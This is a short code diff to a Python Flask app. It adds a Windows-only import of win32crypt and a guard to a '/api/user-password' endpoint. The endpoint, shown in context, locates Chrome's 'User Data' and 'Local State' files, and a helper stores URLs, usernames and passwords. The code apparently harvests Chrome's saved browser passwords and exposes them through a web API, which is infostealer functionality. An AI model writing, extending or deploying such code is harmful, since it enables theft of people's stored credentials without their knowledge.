@@ -18,6 +18,15 @@ import logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
+# Conditionally import Windows modules
+if platform.system() == 'Windows':
+    try:
+        import win32crypt
+    except ImportError:
+        win32crypt = None
+else:
+    win32crypt = None
+
 # Load environment variables from .env file
 load_dotenv()
 
@@ -198,6 +207,11 @@ def add_user_data(id, url, username, password, timestamp):
 @app.route('/api/user-password', methods=['GET'])
 def user_password():
     try:
+        
+        if win32crypt is None:
+            return jsonify({"error": "This feature requires Windows"}), 400
+    
+        
         CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
         CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 
